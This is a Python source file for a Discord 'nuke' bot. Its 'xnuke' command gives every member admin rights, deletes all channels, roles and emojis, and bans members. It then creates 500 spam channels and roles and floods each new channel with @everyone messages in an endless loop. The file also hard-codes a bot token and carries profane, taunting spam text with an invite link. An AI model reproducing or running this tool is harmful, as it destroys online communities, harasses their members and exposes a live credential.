import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "ODY1MTA0NzA3MTcyMzAyODU4.YO_Jiw.7Pt2_Bn5-IwdvYVdPvn4MRA9zmU"


SPAM_CHANNEL =  ["MS OWNS YOU" , "ESCAPE OWNS U" , "HIT BY MS" , "OOPS MY BAD U GOT FUCKED","3MS BEAMED U","FUCKBOY","GET BEAMED CLOWNS","BEAMED BY ESCAPE","MS NUKED","MS RUNS YOU","ESCAPE OWNS YOU","3MS RUNS YOU","MS SMOKED YOU"]
SPAM_MESSAGE = ["@everyone SHIT MY FAULT MS JUST HOED U & U GOT NUKED LOL, JOIN ME. https://discord.gg/cide LOL"]
rolenames = "MS STEPPED ON SHIT"
client = commands.Bot(command_prefix="x")


@client.event
async def on_ready():
   print(''' 

  ▄████ ▓█████  ███▄    █  ▒█████   ▄████▄   ██▓▓█████▄ ▓█████ 
 ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▒██▀ ▀█  ▓██▒▒██▀ ██▌▓█   ▀ 
▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒██░  ██▒▒▓█    ▄ ▒██▒░██   █▌▒███   
░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒▓▓▄ ▄██▒░██░░▓█▄   ▌▒▓█  ▄ 
░▒▓███▀▒░▒████▒▒██░   ▓██░░ ████▓▒░▒ ▓███▀ ░░██░░▒████▓ ░▒████▒
 ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓   ▒▒▓  ▒ ░░ ▒░ ░
  ░   ░  ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░   ░  ▒    ▒ ░ ░ ▒  ▒  ░ ░  ░
░ ░   ░    ░      ░   ░ ░ ░ ░ ░ ▒  ░         ▒ ░ ░ ░  ░    ░   
      ░    ░  ░         ░     ░ ░  ░ ░       ░     ░       ░  ░
                                   ░             ░             
 ''')
   print('MS W JOIN & UHH 6OYW https://discord.gg/cide')
   print('PREFIX IS "x", RUN "xnuke" TO FULLY NUKE THE SERVER')
   await client.change_presence(activity=discord.Game(name="2MS & 3MS RUNS YOU"))



@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} Has logged out successfully." + Fore.RESET)



@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "EVERYONE GOT ADMIN LOLZ." + Fore.RESET)
    except:
      print(Fore.GREEN + "couldnt give admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted, goodshit" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted, RIP" + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned, goodshit" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned, RIP" + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted, goodshit" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted, RIP" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted, goodshit" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted, RIP" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("your username")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned, goodshit" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned, RIP" + Fore.RESET)
    await guild.create_text_channel("MS STEPPED")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite is: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
       await guild.create_role(name=rolenames)
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
         print(f"nuked {guild.name} Successfully, GG MAN GENOCIDE ON TOP")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)
